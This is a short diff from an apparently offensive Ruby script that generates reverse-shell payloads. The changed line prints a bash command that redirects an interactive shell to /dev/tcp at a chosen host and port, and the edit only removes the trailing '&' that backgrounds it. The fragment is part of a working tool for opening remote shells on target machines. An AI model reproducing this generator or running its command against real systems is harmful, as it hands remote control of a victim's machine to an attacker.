@@ -52,7 +52,7 @@ begin
     sleep(0.5)
     puts "#{g}Generating payload..."
     sleep(1)
-    puts "#{r}#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &"
+    puts "#{r}#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1"
 rescue
     puts "#{e}Failed to generate payload!"
 end
